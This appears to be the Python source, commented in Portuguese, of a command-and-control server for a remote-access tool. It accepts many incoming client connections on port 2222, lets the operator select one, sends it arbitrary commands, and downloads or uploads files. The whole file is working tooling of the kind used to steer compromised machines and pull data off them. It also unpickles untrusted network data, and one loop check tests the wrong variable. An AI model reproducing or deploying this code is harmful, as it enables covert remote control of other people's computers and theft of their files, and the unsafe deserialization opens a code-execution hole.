from socket import *
import threading
import pickle
import os


""" Classe para instanciar o servidor e fazer as operações"""
class server:
    """Configurando o servidor"""
    def __init__(self):
        self.server = socket(AF_INET, SOCK_STREAM)
        self.server.bind(("", 2222))
        self.server.listen(50)
        self.clients = []
        self.client_selected = ''

    """Metodo para receber conexões"""
    def cli_connection(self, server):
        while True:
            client, addr = server.accept()
            self.clients.append([client, addr])

    """Metodo para inicializar fluxo para receber as conexões"""
    def listen_connections(self):
        t = threading.Thread(target=self.cli_connection, args=(self.server,))
        t.daemon = True
        t.start()
    
    """Metodo para serializar a msg antes do envio"""
    def send_command(self, data):
        send = pickle.dumps(data)
        return send

    """Metodo para receber msg"""
    def recive_msg(self, msg):
        msg = pickle.loads(msg)
        return msg

    """"Metodo para mostrar os clientes conectados"""
    def show_clients(self):
        count = 0
        for client in self.clients:
            print(f"{count} = {client[1]}")
            count += 1

    """Metodo para se selecionar o cliente"""
    def selected(self, id):
        id = (int(id) - 1)
        self.client_selected = self.clients[id][0]
        return True

    """Metodo para fazer download de arquivos"""
    def download(self, client):
        result = self.recive_msg(client.recv(2048))
        if "Arquivo não existe" in result:
            print(result)
        else:
            file_name = result.split("<>")[0]
            file_size = result.split("<>")[1]
            file_size = int(file_size)
            client.send(self.send_command(f"aguardando envio"))
            with open(file_name, "wb", 0) as f:
                c = 0
                while c != file_size:
                    bytes_read = client.recv(2048)
                    if not bytes:
                        break
                    f.write(bytes_read)
                    c += len(bytes_read)

    """Metodo para fazer upload de arquivos"""
    def upload(self, filename, client):
        try:
            separator = "<>"
            file_name = filename
            file_size = os.path.getsize(file_name)
            file_info = f"{file_name}{separator}{file_size}"
        except:
            alert = f"[-] Arquivo não existe"
            print(alert)
        else:
            client.send(self.send_command(file_info))
            command = self.recive_msg(client.recv(2048))
            with open(file_name, "rb") as f:
                c = 0
                while True:
                    bytes_read = f.read(2048)
                    if not bytes_read:
                        break
                    client.send(bytes_read)

    """Metodo para se conectar ao cliente e enviar comando"""
    def command(self, command_execution):
        command_execution = command_execution.split(" ")

        if command_execution[0] == 'download':
            self.client_selected.send(self.send_command(command_execution))
            self.download(self.client_selected)

        elif command_execution[0] == 'upload':
            self.client_selected.send(self.send_command(command_execution))
            self.upload(command_execution[1], self.client_selected)
            
        else:
            self.client_selected.send(self.send_command(command_execution))
            result = self.recive_msg(self.client_selected.recv(2048))
            return result
